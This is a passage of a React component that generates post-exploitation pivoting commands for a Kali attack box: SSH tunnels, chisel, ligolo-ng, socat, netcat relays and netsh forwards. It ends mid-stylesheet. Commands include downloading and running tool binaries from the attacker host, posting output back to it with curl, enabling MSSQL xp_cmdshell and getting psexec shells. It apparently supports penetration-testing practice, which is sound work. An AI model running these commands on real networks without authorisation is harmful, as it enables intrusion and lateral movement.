import { useState } from "react";

const methods = [
  { id: "ssh_local", label: "SSH Local (-L)" },
  { id: "ssh_dynamic", label: "SSH Dynamic SOCKS (-D)" },
  { id: "ssh_remote", label: "SSH Remote (-R)" },
  { id: "ssh_remote_dynamic", label: "SSH Remote Dynamic" },
  { id: "sshuttle", label: "sshuttle (VPN-like)" },
  { id: "socat", label: "Socat" },
  { id: "nc_fifo", label: "Netcat + FIFO" },
  { id: "plink", label: "Plink (Windows)" },
  { id: "netsh", label: "Netsh (Windows)" },
  { id: "ssh_exe", label: "ssh.exe (Windows)" },
  { id: "chisel_server", label: "Chisel" },
  { id: "ligolo", label: "Ligolo-ng" },
];

const protocols = [
  { id: "scan", label: "Recon / Scan", port: "", tools:
    "# proxychains nmap (may show filtered on 4.17 — use nc loop if so):\nproxychains nmap -sT -Pn -n --top-ports=20 {host}\n\n# nc loop — works when nmap shows everything filtered (proxychains 4.17 bug):\nfor port in $(seq 1 1024); do\n  proxychains nc -zv -w1 {host} $port 2>&1 | grep -i \"open\\|succeeded\"\ndone\n\n# Specific range:\nfor port in $(seq 9000 9100); do\n  proxychains nc -zv -w1 {host} $port 2>&1 | grep -i \"open\\|succeeded\"\ndone" },
  { id: "ssh", label: "SSH → Shell", port: "22", tools:
    "# Direct (port-forward methods):\nssh {user}@{host} -p {lport}\n\n# Through SOCKS (ncat ProxyCommand):\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' {user}@{host}\n# sudo apt install ncat  (if missing)" },
  { id: "winrm", label: "WinRM → Shell", port: "5985", tools:
    "evil-winrm -i {host} -P {lport} -u {user} -p {pass}" },
  { id: "rdp", label: "RDP → Shell", port: "3389", tools:
    "xfreerdp /u:{user} /p:{pass} /v:{host}:{lport} /cert-ignore" },
  { id: "smb", label: "SMB → Shell", port: "445", tools:
    "# Enum shares:\nsmbclient -L //{host}/ -U {user} --password={pass}\ncrackmapexec smb {host} -u {user} -p {pass} --shares\n\n# Shell via psexec (needs admin):\nimpacket-psexec {user}:{pass}@{host}\nimpacket-smbexec {user}:{pass}@{host}\n\n# Through SOCKS:\nproxychains impacket-psexec {user}:{pass}@{host}" },
  { id: "mssql", label: "MSSQL → Shell", port: "1433", tools:
    "# Connect:\nimpacket-mssqlclient {user}:{pass}@{host} -port {lport}\n# Through SOCKS:\nproxychains impacket-mssqlclient {user}:{pass}@{host}\n\n# Enable xp_cmdshell for shell:\nEXEC sp_configure 'show advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';" },
  { id: "http", label: "HTTP / Web", port: "80", tools:
    "curl http://{host}:{lport}\nferoxbuster -u http://{host}:{lport}\n# Through SOCKS:\nproxychains curl http://{host}:{lport}\nproxychains feroxbuster -u http://{host}:{lport}" },
  { id: "postgres", label: "PostgreSQL", port: "5432", tools:
    "psql -h {host} -p {lport} -U postgres\n# Through SOCKS:\nproxychains psql -h {host} -p {lport} -U postgres" },
  { id: "nfs", label: "NFS", port: "2049", tools:
    "showmount -e {host}\nmkdir /tmp/nfs && mount -t nfs {host}:/ /tmp/nfs -o nolock\n# Through SOCKS:\nproxychains showmount -e {host}" },
  { id: "custom", label: "Custom", port: "", tools: "" },
];


// ── WIZARD DECISION TREE ─────────────────────────────
const tree = {
  start: { q:"Can Kali connect TO the pivot host directly?", hint:"Is the pivot reachable from your attack box, or does a firewall block inbound?", opts:[
    { label:"Yes — Kali can reach pivot", next:"has_ssh_out" },
    { label:"No — inbound is firewalled", next:"pivot_can_reach_kali" },
  ]},
  has_ssh_out: { q:"Do you have SSH credentials for the pivot?", opts:[
    { label:"Yes — SSH creds available", next:"ssh_available" },
    { label:"No — shell only, no SSH creds", next:"no_ssh_creds" },
  ]},
  ssh_available: { q:"How many internal targets do you need?", opts:[
    { label:"One specific port / service", next:"one_target" },
    { label:"Multiple hosts — need to scan", next:"multi_target" },
  ]},
  one_target: { q:"Want transparent routing (no proxychains)?", opts:[
    { label:"Yes — VPN-like direct access", next:"sshuttle_check" },
    { label:"No — single port forward is fine", result:"ssh_local" },
  ]},
  sshuttle_check: { q:"Root on Kali + Python3 on pivot?", opts:[
    { label:"Yes", result:"sshuttle" },
    { label:"No / unsure", result:"ssh_local" },
  ]},
  multi_target: { q:"Can you upload tools to the pivot?", opts:[
    { label:"Yes — can transfer binaries", next:"has_tools" },
    { label:"No — restricted environment", result:"ssh_dynamic" },
  ]},
  has_tools: { q:"Which tool is available?", opts:[
    { label:"Ligolo agent (fastest, no proxychains)", result:"ligolo" },
    { label:"Chisel", result:"chisel_server" },
    { label:"Neither — SSH creds only", result:"ssh_dynamic" },
  ]},
  no_ssh_creds: { q:"Is socat on the pivot?", opts:[
    { label:"Yes", result:"socat" },
    { label:"No", next:"no_tools_check" },
  ]},
  no_tools_check: { q:"What OS is the pivot?", opts:[
    { label:"Linux — bash + nc available", result:"nc_fifo" },
    { label:"Windows", next:"win_admin" },
  ]},
  pivot_can_reach_kali: { q:"Can pivot SSH OUT to Kali (port 22)?", hint:"Outbound SSH is usually allowed even when inbound is blocked", opts:[
    { label:"Yes — pivot can reach Kali", next:"remote_type" },
    { label:"No — fully locked down", next:"pivot_os" },
  ]},
  remote_type: { q:"How many targets?", opts:[
    { label:"One specific port", result:"ssh_remote" },
    { label:"Multiple — need full access", result:"ssh_remote_dynamic" },
  ]},
  pivot_os: { q:"What OS is the pivot?", opts:[
    { label:"Linux — limited options", result:"nc_fifo" },
    { label:"Windows", next:"win_admin" },
  ]},
  win_admin: { q:"What's available on the Windows pivot?", opts:[
    { label:"OpenSSH (Windows 10 1803+)", result:"ssh_exe" },
    { label:"Can upload plink.exe", result:"plink" },
    { label:"Admin rights — use native Netsh", result:"netsh" },
  ]},
};

const wizResults = {
  ssh_local: { why:"Direct access + single target = SSH Local (-L). Simplest and most reliable.", when:"One port, SSH creds, Kali can reach pivot directly." },
  ssh_dynamic: { why:"Multiple targets = SSH Dynamic (-D) creates a SOCKS proxy. Scan anything via proxychains.", when:"Need to scan internal network, SSH creds available." },
  ssh_remote: { why:"Inbound blocked but outbound works = SSH Remote (-R). Pivot connects back to Kali.", when:"Firewall blocks inbound, pivot can SSH out, single target." },
  ssh_remote_dynamic: { why:"Inbound blocked + multiple targets = reverse SOCKS proxy on Kali via outbound SSH.", when:"Firewall blocks inbound, pivot can SSH out, need to scan." },
  sshuttle: { why:"Transparent VPN-like routing. No proxychains — tools work natively. Best experience.", when:"Root on Kali, Python3 on pivot, multiple targets." },
  socat: { why:"No SSH creds but socat available = one-command port forward.", when:"Shell access, socat installed, no SSH creds." },
  nc_fifo: { why:"Bare minimum — bash + nc only. Single connection.", when:"Fully restricted pivot, no tools available." },
  plink: { why:"Windows without OpenSSH = Plink for SSH remote port forwarding.", when:"Windows pivot, can upload plink.exe, no OpenSSH." },
  netsh: { why:"Native Windows port forwarding. No tools needed — but needs admin and leaves artifacts.", when:"Windows pivot with admin rights." },
  ssh_exe: { why:"Modern Windows has OpenSSH built in. Same commands as Linux.", when:"Windows 10 1803+ with OpenSSH available." },
  chisel_server: { why:"Can upload tools + need SOCKS = Chisel reverse tunnel.", when:"Can transfer binaries, need full internal access." },
  ligolo: { why:"Fastest option — native routing, no proxychains overhead. Upload agent once.", when:"Can transfer agent binary, need maximum flexibility." },
};

function Wizard({ onSelect }) {
  const [history, setHistory] = useState([{ node:"start" }]);
  const [done, setDone] = useState(null);
  const current = history[history.length-1];
  const node = tree[current.node];

  const choose = (opt) => {
    if (opt.result) {
      setDone(opt.result);
    } else {
      setHistory(h => [...h, { node: opt.next }]);
    }
  };

  const back = () => {
    if (done) { setDone(null); return; }
    if (history.length > 1) setHistory(h => h.slice(0,-1));
  };

  const reset = () => { setHistory([{node:"start"}]); setDone(null); };

  if (done) {
    const res = wizResults[done];
    const methodLabel = methods.find(m=>m.id===done)?.label || done;
    return (
      <div className="wiz-result">
        <div className="wiz-rec-label">Recommended Method</div>
        <div className="wiz-rec-method">{methodLabel}</div>
        <div className="wiz-rec-why">{res.why}</div>
        <div className="wiz-rec-when">Best when: {res.when}</div>
        <div className="wiz-btns">
          <button className="wiz-use" onClick={()=>onSelect(done)}>Use this method →</button>
          <button className="wiz-back" onClick={back}>← Back</button>
          <button className="wiz-reset" onClick={reset}>Start over</button>
        </div>
      </div>
    );
  }

  return (
    <div className="wiz-body">
      {history.length > 1 && (
        <div className="wiz-breadcrumb">
          {history.map((h,i) => (
            <span key={i} className="wiz-bc-item">
              {i>0 && <span className="wiz-bc-sep">›</span>}
              {tree[h.node]?.q?.slice(0,30)}...
            </span>
          ))}
        </div>
      )}
      <div className="wiz-q">{node?.q}</div>
      {node?.hint && <div className="wiz-hint">💡 {node.hint}</div>}
      <div className="wiz-opts">
        {node?.opts?.map((opt,i) => (
          <button key={i} className="wiz-opt" onClick={()=>choose(opt)}>
            {opt.label}
          </button>
        ))}
      </div>
      {history.length > 1 && (
        <button className="wiz-back" onClick={back}>← Back</button>
      )}
    </div>
  );
}

const usesSocks = (m) => ["ssh_dynamic","ssh_remote_dynamic","ssh_exe","chisel_server"].includes(m);
const isRemote = (m) => ["ssh_remote","ssh_remote_dynamic","plink","ssh_exe"].includes(m);

function CopyBtn({ text, label }) {
  const [ok, setOk] = useState(false);
  return (
    <button className={`cbtn${ok?" copied":""}`} onClick={() => { navigator.clipboard.writeText(text); setOk(true); setTimeout(()=>setOk(false),1500); }}>
      {ok ? "✓" : (label || "⎘")}
    </button>
  );
}

function ObsBtn({ blocks }) {
  const [ok, setOk] = useState(false);
  const handle = () => {
    const md = blocks.filter(b=>b.cmd).map(b =>
      `## ${b.label}\n\`\`\`bash\n${b.cmd}\n\`\`\`${b.note?`\n> ${b.note}`:""}`
    ).join("\n\n");
    navigator.clipboard.writeText(md);
    setOk(true); setTimeout(()=>setOk(false),1800);
  };
  return <button className={`obtn${ok?" copied":""}`} onClick={handle}>{ok?"✓ Copied":"⬡ Copy All (Obsidian MD)"}</button>;
}

function CmdBlock({ label, cmd, note, verify }) {
  if (!cmd) return null;
  return (
    <div className="cblock">
      <div className="cheader">
        <span className="clabel">{label}</span>
        <CopyBtn text={cmd} />
      </div>
      <pre className="ctext">{cmd}</pre>
      {note && <div className="cnote">💡 {note}</div>}
      {verify && (
        <div className="cverify">
          <span className="vlabel">✓ verify</span>
          <pre className="vtext">{verify}</pre>
          <CopyBtn text={verify} label="⎘" />
        </div>
      )}
    </div>
  );
}

function gen(method, f) {
  const p = {
    kali: f.kaliIp||"<kali_ip>", pivotExt: f.pivotExtIp||"<pivot_ext>",
    pivotInt: f.pivotIntIp||"<pivot_int>", user: f.pivotUser||"user",
    pass: f.pivotPass||"<pass>", target: f.targetIp||"<target>",
    tp: f.targetPort||"<port>", lp: f.listenPort||"4455",
    sp: f.socksPort||"9999", h2: f.hop2Ip||"<hop2>",
    h2p: f.hop2Port||"22", h2u: f.hop2User||"user", h2lp: f.hop2ListenPort||"4466",
  };
  const hasH2 = f.hop2Ip && f.hop2Ip.length > 3;
  const h2block = hasH2 ? {
    label: "▶ Double pivot — second hop",
    cmd: `# On pivot1 — forward to pivot2 then target:\nssh -N -L 0.0.0.0:${p.h2lp}:${p.target}:${p.tp} ${p.h2u}@${p.h2}\n\n# Chain: Kali → ${p.pivotExt}:${p.lp} → ${p.h2} → ${p.target}:${p.tp}`,
    note: `Double pivot via ${p.h2}`,
    verify: `ss -ntlp | grep ${p.h2lp}`,
  } : null;

  switch(method) {
    case "ssh_local": return [
      { label:"▶ On pivot host — start tunnel", cmd:`ssh -N -L 0.0.0.0:${p.lp}:${p.target}:${p.tp} ${p.user}@${p.pivotInt}`, note:"-N = no output is normal", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ Confirm from Kali", cmd:`nc -zv ${p.pivotExt} ${p.lp} && echo "TUNNEL UP"`, verify:`nc -zv ${p.pivotExt} ${p.lp}` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_dynamic": return [
      { label:"▶ On pivot host — open SOCKS proxy", cmd:`ssh -N -D 0.0.0.0:${p.sp} ${p.user}@${p.pivotInt}`, note:"Creates SOCKS proxy on pivot external interface", verify:`ss -ntlp | grep ${p.sp}` },
      { label:"▶ Test from Kali (after proxychains config)", cmd:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_remote": return [
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh\nsudo ss -ntlp | grep 22`, note:"Set PasswordAuthentication yes in /etc/ssh/sshd_config if needed" },
      { label:"▶ On pivot host — connect back to Kali", cmd:`ssh -N -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} kali@${p.kali}`, note:"Firewall blocks inbound? Pivot connects OUT to Kali", verify:`# On Kali:\nss -ntlp | grep ${p.lp}` },
      { label:"▶ From Kali — connect on localhost", cmd:`psql -h 127.0.0.1 -p ${p.lp} -U postgres\nssh user@127.0.0.1 -p ${p.lp}`, verify:`nc -zv 127.0.0.1 ${p.lp} && echo "UP"` },
      ...(h2block?[h2block]:[]),
    ];
    case "ssh_remote_dynamic": return [
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh` },
      { label:"▶ On pivot — reverse SOCKS to Kali", cmd:`ssh -N -R ${p.sp} kali@${p.kali}`, note:"SOCKS proxy on Kali localhost — pivot connects out", verify:`# On Kali:\nss -ntlp | grep ${p.sp}` },
      { label:"▶ From Kali — use proxychains", cmd:`proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains smbclient -L //${p.target}/ -U ${p.user}`, verify:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
      ...(h2block?[h2block]:[]),
    ];
    case "sshuttle": {
      const sn = f.targetIp ? f.targetIp.split('.').slice(0,3).join('.')+'.0/24' : '172.16.50.0/24';
      return [
        { label:"▶ Optional — socat to reach SSH (if no direct access)", cmd:`socat TCP-LISTEN:2222,fork TCP:${p.pivotInt}:22\n# Skip if you can SSH directly to pivot` },
        { label:"▶ On Kali — run sshuttle (sudo required)", cmd:`sshuttle -r ${p.user}@${p.pivotExt}:2222 ${sn}\n# Multiple subnets:\nsshuttle -r ${p.user}@${p.pivotExt}:2222 10.4.50.0/24 172.16.50.0/24`, note:"Root on Kali + Python3 on pivot required. No proxychains needed after.", verify:`nc -zv ${p.target} ${p.tp} && echo "ROUTED OK"` },
        { label:"▶ From Kali — direct access, no proxychains", cmd:`nmap -sT -Pn ${p.target}\nsmbclient -L //${p.target}/ -U ${p.user} --password=${p.pass}` },
        { label:"▶ Cleanup", cmd:`# Ctrl+C in sshuttle terminal — routes removed automatically` },
      ];
    }
    case "socat": return [
      { label:"▶ On pivot host — start forwarder", cmd:`socat -ddd TCP-LISTEN:${p.lp},fork TCP:${p.target}:${p.tp}`, note:"-ddd = verbose. Kill with: kill $(pgrep socat)", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ Confirm from Kali", cmd:`nc -zv ${p.pivotExt} ${p.lp} && echo "SOCAT UP"` },
      { label:"▶ Cleanup", cmd:`kill $(pgrep socat)` },
      ...(h2block?[h2block]:[]),
    ];
    case "nc_fifo": return [
      { label:"▶ On pivot — nc + fifo", cmd:`mkfifo /tmp/pivot_pipe\nnc -lnvp ${p.lp} < /tmp/pivot_pipe | nc ${p.target} ${p.tp} > /tmp/pivot_pipe`, note:"Single connection only — restart for each new connection", verify:`ss -ntlp | grep ${p.lp}` },
      { label:"▶ From Kali", cmd:`nc ${p.pivotExt} ${p.lp}` },
    ];
    case "plink": return [
      { label:"▶ On Kali — serve plink + start SSH", cmd:`sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/\nsudo systemctl start apache2\nsudo systemctl start ssh` },
      { label:"▶ On Windows — download plink", cmd:`powershell wget -Uri http://${p.kali}/plink.exe -OutFile C:\\Windows\\Temp\\plink.exe` },
      { label:"▶ On Windows — remote port forward", cmd:`C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <kali_password> -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} ${p.kali}`, note:"Password on command line — risky. Plink does NOT support -D dynamic.", verify:`# On Kali:\nss -ntlp | grep ${p.lp}` },
      { label:"▶ Non-TTY shell — pipe y for host key", cmd:`cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw <pass> -R 127.0.0.1:${p.lp}:${p.target}:${p.tp} ${p.kali}` },
      { label:"▶ From Kali — connect on localhost", cmd:`psql -h 127.0.0.1 -p ${p.lp} -U postgres\nssh user@127.0.0.1 -p ${p.lp}`, verify:`nc -zv 127.0.0.1 ${p.lp} && echo "UP"` },
    ];
    case "netsh": return [
      { label:"▶ On Windows (admin) — create port forward", cmd:`netsh interface portproxy add v4tov4 listenport=${p.lp} listenaddress=${p.pivotExt} connectport=${p.tp} connectaddress=${p.target}`, verify:`netsh interface portproxy show all\nnetstat -anp TCP | find "${p.lp}"` },
      { label:"▶ Open firewall hole (required — filtered without this)", cmd:`netsh advfirewall firewall add rule name="pf_${p.lp}" protocol=TCP dir=in localip=${p.pivotExt} localport=${p.lp} action=allow`, note:"Port shows as filtered from Kali without this rule", verify:`# From Kali:\nnmap -sS ${p.pivotExt} -Pn -n -p${p.lp}` },
      { label:"▶ From Kali — connect through forward", cmd:`ssh ${p.user}@${p.pivotExt} -p ${p.lp}\npsql -h ${p.pivotExt} -p ${p.lp} -U postgres`, verify:`nc -zv ${p.pivotExt} ${p.lp} && echo "UP"` },
      { label:"▶ CLEANUP — always delete when done", cmd:`netsh advfirewall firewall delete rule name="pf_${p.lp}"\nnetsh interface portproxy del v4tov4 listenport=${p.lp} listenaddress=${p.pivotExt}` },
    ];
    case "ssh_exe": return [
      { label:"▶ Verify ssh.exe version", cmd:`where ssh\nssh.exe -V\n# Needs >= 7.6 for remote dynamic` },
      { label:"▶ On Kali — start SSH server", cmd:`sudo systemctl start ssh`, note:"Set PasswordAuthentication yes in sshd_config if needed" },
      { label:"▶ On Windows — remote dynamic SOCKS", cmd:`ssh -N -R ${p.sp} kali@${p.kali}`, note:"Creates SOCKS proxy on Kali localhost", verify:`# On Kali:\nss -ntlp | grep ${p.sp}` },
      { label:"▶ From Kali — use proxychains", cmd:`proxychains nmap -sT -Pn -n --top-ports=20 ${p.target}\nproxychains psql -h ${p.target} -U postgres`, verify:`proxychains nc -zv ${p.target} ${p.tp} 2>&1 | grep -i "open\\|succeeded"` },
    ];
    case "chisel_server": return [
      { label:"▶ On Kali — serve chisel binary", cmd:`sudo cp $(which chisel) /var/www/html/\nsudo systemctl start apache2\n# If target gets GLIBC error — use Go 1.19 build instead:\nwget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz\ngunzip chisel_1.8.1_linux_amd64.gz && mv chisel_1.8.1_linux_amd64 chisel\nsudo cp chisel /var/www/html/`, note:"GLIBC mismatch = Kali chisel (Go 1.20+) won't run on Ubuntu 20.04. Use Go 1.19 build from GitHub." },
      { label:"▶ On Kali — start chisel server", cmd:`chisel server --port 8080 --reverse`, verify:`ss -ntlp | grep 8080` },
      { label:"▶ On pivot — download chisel", cmd:`wget http://${p.kali}/chisel -O /tmp/chisel && chmod +x /tmp/chisel` },
      { label:"▶ On pivot — start reverse SOCKS", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks > /dev/null 2>&1 &`, note:"SOCKS proxy created on Kali port 1080. No output = working.", verify:`# On Kali:\nss -ntlp | grep 1080` },
      { label:"▶ Debug — capture error output from pivot", cmd:`/tmp/chisel client ${p.kali}:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://${p.kali}:8080/\n# tcpdump on Kali shows error in POST body:\nsudo tcpdump -nvvvXi tun0 tcp port 8080`, note:"Use this if chisel fails silently — sends error output back via HTTP" },
      { label:"▶ SSH through SOCKS (needs ncat)", cmd:`# Install ncat if needed:\nsudo apt install ncat\n\n# SSH via SOCKS proxy:\nssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' ${p.pivotUser}@${p.target}`, note:"Standard nc doesn't support SOCKS. Use ncat from nmap project." },
      { label:"▶ Single port forward (no SOCKS)", cmd:`/tmp/chisel client ${p.kali}:8080 R:${p.lp}:${p.target}:${p.tp}\n# Kali localhost:${p.lp} → ${p.target}:${p.tp}` },
      ...(h2block?[h2block]:[]),
    ];
    case "ligolo": return [
      { label:"▶ On Kali — setup tun + start proxy", cmd:`sudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601`, verify:`ip link show ligolo` },
      { label:"▶ Transfer agent to pivot", cmd:`python3 -m http.server 80\n# On pivot:\nwget http://${p.kali}/agent -O /tmp/agent && chmod +x /tmp/agent` },
      { label:"▶ On pivot — connect agent", cmd:`/tmp/agent -connect ${p.kali}:11601 -ignore-cert` },
      { label:"▶ In ligolo console", cmd:`session\n# select session number\nstart` },
      { label:"▶ On Kali — add route", cmd:`sudo ip route add ${f.targetIp?f.targetIp.split('.').slice(0,3).join('.')+'.0/24':'172.16.50.0/24'} dev ligolo`, verify:`ip route | grep ligolo` },
      { label:"▶ From Kali — direct access (no proxychains)", cmd:`nmap -sT -Pn ${p.target}\nsmbclient -L //${p.target}/ -U ${p.user}\npsql -h ${p.target} -p ${p.tp} -U postgres`, note:"Fastest — routes natively", verify:`ping -c1 ${p.target} && echo "ROUTE OK"` },
      ...(h2block?[h2block]:[]),
    ];
    default: return [];
  }
}

export default function PivotCalc() {
  const [method, setMethod] = useState("ssh_local");
  const [proto, setProto] = useState("smb");
  const [showH2, setShowH2] = useState(false);
  const [showWiz, setShowWiz] = useState(false);
  const [f, setF] = useState({
    kaliIp:"", pivotExtIp:"", pivotIntIp:"", pivotUser:"database_admin", pivotPass:"",
    targetIp:"", targetPort:"445", listenPort:"4455", socksPort:"9999",
    hop2Ip:"", hop2Port:"22", hop2User:"user", hop2ListenPort:"4466",
  });
  const set = k => e => setF(v=>({...v,[k]:e.target.value}));
  const handleProto = (id, port) => { setProto(id); if(port) setF(v=>({...v,targetPort:port})); };

  const cmds = gen(method, f);
  const socks = usesSocks(method);
  const remote = isRemote(method);
  const selProto = protocols.find(p=>p.id===proto);
  const pcHost = remote ? "127.0.0.1" : (f.pivotExtIp||"<pivot_ext>");
  // SOCKS methods: connect directly to target IP:targetPort via proxychains
  // Port-forward methods: connect to pivot external IP:listenPort
  const toolHost = socks ? (f.targetIp||"<target>") : (f.pivotExtIp||"<pivot>");
  const toolPort = socks ? (f.targetPort||"<port>") : (f.listenPort||"4455");

  // For scan protocol — use subnet not single host
  const scanSubnet = f.targetIp
    ? f.targetIp.split('.').slice(0,3).join('.') + '.0/24'
    : "<target_subnet>/24";
  const scanHost = proto === "scan"
    ? (socks ? scanSubnet : f.pivotExtIp||"<pivot>")
    : toolHost;

  const toolsRaw = selProto?.tools
    ?.replace(/{host}/g, scanHost)
    ?.replace(/{lport}/g, toolPort)
    ?.replace(/{user}/g, f.pivotUser||"user")
    ?.replace(/{pass}/g, f.pivotPass||"<pass>");

  // Scan protocol — don't blindly prepend proxychains to every line
  // nc loop lines already have proxychains in them
  const tools = (socks && toolsRaw && proto !== "scan")
    ? toolsRaw.split('\n').map(l=>l.trim() && !l.startsWith('#') && !l.startsWith('proxychains') ? `proxychains ${l}` : l).join('\n')
    : toolsRaw;

  const pcConf = `# /etc/proxychains4.conf — replace [ProxyList] at bottom:\nsocks5 ${pcHost} ${f.socksPort||"9999"}\n\n# Speed up nmap scans:\ntcp_read_time_out 800\ntcp_connect_time_out 700`;

  const diagNodes = [
    {label:"Kali", ip:f.kaliIp||"?.?.?.?", color:"#4ade80"},
    {label:"Pivot", ip:f.pivotExtIp||"?.?.?.?", color:"#facc15"},
    ...(showH2&&f.hop2Ip?[{label:"Pivot 2",ip:f.hop2Ip,color:"#f97316"}]:[]),
    {label:"Target", ip:f.targetIp||"?.?.?.?", color:"#f87171"},
  ];

  return (
    <div className="r">
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@700;800&display=swap');
        *{box-sizing:border-box;margin:0;padding:0}
        .r{min-height:100vh;background:#080b12;color:#c8d6e5;font-family:'JetBrains Mono',monospace;padding:2rem 1rem}
        .hdr{max-width:960px;margin:0 auto 1.5rem;border-bottom:1px solid #1e2d40;padding-bottom:1.25rem}
        .back{display:inline-block;margin-bottom:.75rem;color:#4a5568;font-size:.72rem;text-decoration:none}
        .back:hover{color:#4ade80}
        .title{font-family:'Syne',sans-serif;font-size:1.9rem;font-weight:800;color:#4ade80;letter-spacing:-.02em}
        .sub{font-size:.7rem;color:#4a5568;margin-top:.2rem;text-transform:uppercase;letter-spacing:.1em}
        .body{max-width:960px;margin:0 auto;display:grid;gap:1.1rem}
        .diag{background:#0d1520;border:1px solid #1e2d40;border-radius:8px;padding:1.1rem;display:flex;align-items:center;overflow-x:auto;gap:0}
        .dn{display:flex;flex-direction:column;align-items:center;min-width:100px}
        .db{border:1px solid;border-radius:5px;padding:.45rem .65rem;font-size:.62rem;text-align:center;width:100%}
        .dl{font-weight:700;font-size:.58rem;text-transform:uppercase;letter-spacing:.08em;margin-bottom:.12rem}
        .dip{font-size:.58rem;opacity:.7}
        .darr{flex:1;min-width:45px;display:flex;flex-direction:column;align-items:center;gap:2px}
        .dline{height:2px;width:100%;background:linear-gradient(90deg,#1e3a5f,#2d5a8e,#1e3a5f)}
        .dport{font-size:.52rem;color:#4a90d9}
        .sec{background:#0d1520;border:1px solid #1e2d40;border-radius:8px;padding:1.1rem}
        .stitle{font-size:.6rem;text-transform:uppercase;letter-spacing:.12em;color:#4a5568;margin-bottom:.9rem;padding-bottom:.45rem;border-bottom:1px solid #1a2535;display:flex;justify-content:space-between;align-items:center}
        .mgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:.35rem}
        .mbtn{background:#0a1018;border:1px solid #1e2d40;border-radius:5px;padding:.5rem .65rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.65rem;cursor:pointer;text-align:left;transition:all .12s}
        .mbtn:hover{border-color:#2d4a6b;color:#7a9bbf}
        .mbtn.active{border-color:#4ade80;color:#4ade80;background:#0d1f10}
        .pgrid{display:flex;flex-wrap:wrap;gap:.3rem}
        .pbtn{background:#0a1018;border:1px solid #1e2d40;border-radius:4px;padding:.25rem .5rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.6rem;cursor:pointer;transition:all .12s}
        .pbtn:hover{border-color:#2d4a6b;color:#7a9bbf}
        .pbtn.active{border-color:#facc15;color:#facc15;background:#1a1500}
        .igrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:.6rem}
        .fld{display:flex;flex-direction:column;gap:.22rem}
        .fld label{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:#4a5568}
        .fld input{background:#0a1018;border:1px solid #1e2d40;border-radius:4px;padding:.4rem .5rem;color:#c8d6e5;font-family:'JetBrains Mono',monospace;font-size:.7rem;outline:none;transition:border-color .12s;width:100%}
        .fld input:focus{border-color:#4ade80}
        .fld input::placeholder{color:#2d4a6b}
        .h2btn{background:none;border:1px solid #1e2d40;border-radius:4px;padding:.25rem .6rem;color:#4a5568;font-family:'JetBrains Mono',monospace;font-size:.6rem;cursor:pointer;transition:all .12s}
        .h2btn:hover,.h2btn.active{border-color:#f97316;color:#f97316;background:#1a0a00}
        .h2sec{margin-top:.7rem;padding-top:.7rem;border-top:1px solid #1a2535}
        .h2lbl{font-size:.56rem;color:#f97316;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.6rem}
        .carea{display:flex;flex-direction:column;gap:.6rem}
        .cblock{background:#060a10;border:1px solid #1a2535;border-radius:6px;overflow:hidden}
        .pc-block{border-color:#1e3a5f}
        .tl-block{border-color:#1a2d1a}
        .cheader{display:flex;justify-content:space-between;align-items:center;padding:.32rem .65rem;background:#0a1520;border-bottom:1px solid #1a2535}
        .clabel{font-size:.6rem;color:#4a90d9;letter-spacing:.04em}
        .tl-block .clabel{color:#4ade80}
        .pc-block .clabel{color:#60a5fa}
        .cbtn{background:none;border:1px solid #1e2d40;border-radius:3px;color:#4a5568;font-size:.62rem;padding:.1rem .35rem;cursor:pointer;transition:all .12s;font-family:inherit;white-space:nowrap}
        .cbtn:hover,.cbtn.copied{border-color:#4ade80;color:#4ade80}
        .obtn{background:#0a1018;border:1px solid #7c3aed;border-radius:5px;color:#a78bfa;font-family:'JetBrains Mono',monospace;font-size:.62rem;padding:.35rem .7rem;cursor:pointer;transition:all .12s}
        .obtn:hover{background:#1a0a2e}
        .obtn.copied{border-color:#4ade80;color:#4ade80}
        .ctext{padding:.65rem;font-size:.68rem;line-height:1.65;color:#a0c4e8;white-space:pre-wrap;word-break:break-all}
        .cnote{padding:.3rem .65rem;font-size:.58rem;color:#4a6580;border-top:1px solid #1a2535}
        .cverify{padding:.35rem .65rem;background:#0a1810;border-top:1px solid #1a2d1a;display:flex;align-items:flex-start;gap:.45rem}
        .vlabel{font-size:.52rem;color:#4ade80;text-transform:uppercase;letter-spacing:.08em;white-space:nowrap;padding-top:.08rem}
        .vtext{font-size:.62rem;color:#6eca8a;flex:1;white-space:pre-wrap;word-break:break-all}
        .empty{text-align:center;padding:2rem;color:#2d4a6b;font-size:.72rem}
        .chwrap{display:flex;justify-content:space-between;align-items:center;width:100%}
        .wiz-wrap{border:1px solid #1e3a5f;border-radius:8px;overflow:hidden}
